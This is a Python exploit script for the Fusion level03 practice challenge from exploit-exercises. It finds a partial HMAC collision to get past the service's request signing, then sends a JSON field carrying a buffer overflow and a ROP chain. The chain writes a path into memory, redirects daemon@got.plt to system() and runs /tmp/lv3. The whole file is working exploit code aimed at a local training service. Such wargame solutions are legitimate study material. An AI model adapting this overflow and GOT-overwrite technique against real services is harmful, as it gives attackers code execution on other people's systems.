# exploit-exercises - fusion - level03
# exploit by @vnico
# current status:
# partial collision hash: OK
# EIP: OK 
# http://vnico.mundodisco.net
import socket
from struct import pack
from hashlib import sha1
import hmac
import json


def sign_request(token, request):
	hashed = hmac.new(token, request, sha1)
	return hashed.digest()

def collide(token, dict_request):
	i = 0
	while True:
		dict_request['c'] = i
		attempt = sign_request(token, '{0}\n{1}'.format(token, json.dumps(dict_request)))	
		if attempt.encode('hex')[:4] == '0000':
			print '[*] Collision found: {0}'.format(attempt.encode('hex'))
			print '[*] Collision request: {0}'.format(json.dumps(dict_request))
			return dict_request
		i += 1


def int2json(integer):
	ret = '\u{0:02x}{1:02x}'.format(ord(integer[0]), ord(integer[1]))
	ret += '\u{0:02x}{1:02x}'.format(ord(integer[2]), ord(integer[3]))
	return ret

HOST = '127.0.0.1'
PORT = 20003
DICT_REQUEST = { 'title': 'title', 'contents': 'contents', 'tags': ['tag1', 'tag2'], 'serverip': '127.0.0.1' }
#DICT_REQUEST['title'] = 'A' * 127 + '\u4141' + 'A'*32 + int2json(pack('<I', 0xbaadf00d)) 

rop = (
	int2json(pack('<I', 0x0804a2d4)), # pop ebx ;
	int2json(pack('<I', (0x0804bdb0-0x5d5b04c4 & 0xffffffff))), # __data__start
	int2json(pack('<I', 0x8049b4f)), #  pop eax ; add esp 0x5c ;;
	"/tmp",
	"A"*0x5C,
	int2json(pack('<I', 0x80493fe)), # add [ebx+0x5d5b04c4] eax ;;

	int2json(pack('<I', 0x0804a2d4)), # pop ebx ;
	int2json(pack('<I', (0x0804bdb4-0x5d5b04c4 & 0xffffffff))), # __data__start+4
	int2json(pack('<I', 0x8049b4f)), #  pop eax ; add esp 0x5c ;;
	"/lv3",
	"A"*0x5C,
	int2json(pack('<I', 0x80493fe)), # add [ebx+0x5d5b04c4] eax ;;

	int2json(pack('<I', 0x0804a2d4)), # pop ebx ;
	int2json(pack('<I', (0x0804bcec-0x5d5b04c4 & 0xffffffff))), # daemon@got.plt 
	int2json(pack('<I', 0x8049b4f)), #  pop eax ; add esp 0x5c ;;
	int2json(pack('<I', 0xfff6e760)), # --> offset between daemon() and system()
	#"A"*0x5C,
	'A' * 32, 
	int2json(pack('<I', 0x00000000)), # *envp of execve() 
	'A' * 56,
	int2json(pack('<I', 0x80493fe)), # add [ebx+0x5d5b04c4] eax ;;

	int2json(pack('<I', 0x0804a2d4)), # pop ebx ;
	int2json(pack('<I', 0x0804bcec - (0x41414141*4-0x110) & 0xffffffff)), # daemon@got.plt now pointing to system()
	int2json(pack('<I', 0x804a25b)), #call [ebx+esi*4-0x110] ; add esi 0x1 ; cmp esi edi ; jnz 0x804a248 ; add esp 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp 
	int2json(pack('<I', 0x0804bdb0)), # pointer to /tmp/lv3 (__data_start)
)

DICT_REQUEST['title'] = 'A' * 127 + '\u4141' + 'A'*31 + ''.join(rop)

print '[*] Connecting to service...'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
token = s.recv(128)
token = token.strip().strip('"')
print '[*] Received token {0}'.format(token)
print '[*] Original hash: {0}'.format(sign_request(token, '{0}\n{1}'.format(token, json.dumps(DICT_REQUEST))).encode('hex'))
collider = collide(token, DICT_REQUEST)
s.sendall('{0}\n{1}'.format(token, json.dumps(DICT_REQUEST)))
s.close()
